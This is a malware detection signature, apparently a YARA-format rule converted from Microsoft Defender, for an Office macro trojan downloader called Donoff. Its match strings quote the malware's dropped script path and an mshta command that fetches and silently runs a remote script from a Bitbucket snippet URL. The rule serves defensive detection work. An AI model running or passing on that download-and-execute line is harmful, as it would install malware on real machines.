
rule TrojanDownloader_O97M_Donoff_OCSM_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.OCSM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {6d 65 69 6e 6d 61 64 61 72 63 68 6f 6f 64 68 75 6e 35 6e 6f 6f 6f 5f 50 72 6f 63 65 36 36 } //1 meinmadarchoodhun5nooo_Proce66
		$a_01_1 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 6d 6f 74 6f 72 2e 6a 73 22 29 } //1 C:\Users\Public\Documents\motor.js")
		$a_01_2 = {6d 73 68 74 61 20 68 74 74 70 73 3a 2f 2f 62 69 74 62 75 63 6b 65 74 2e 6f 72 67 2f 21 61 70 69 2f 32 2e 30 2f 73 6e 69 70 70 65 74 73 2f 72 69 6b 69 6d 61 72 74 69 6e 70 6c 61 63 65 2f 36 45 36 6a 39 79 2f 39 37 31 30 62 62 39 38 61 30 63 63 30 31 39 37 32 64 63 30 66 34 33 61 65 30 35 38 37 30 66 31 38 39 64 62 36 30 35 33 2f 66 69 6c 65 73 2f 76 73 69 6f 6e 74 68 65 67 72 65 61 74 22 22 3b 6b 61 6d 69 61 62 61 2e 52 75 6e 28 62 68 6f 74 68 6f 67 79 61 2c 30 29 3b 22 } //1 mshta https://bitbucket.org/!api/2.0/snippets/rikimartinplace/6E6j9y/9710bb98a0cc01972dc0f43ae05870f189db6053/files/vsionthegreat"";kamiaba.Run(bhothogya,0);"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}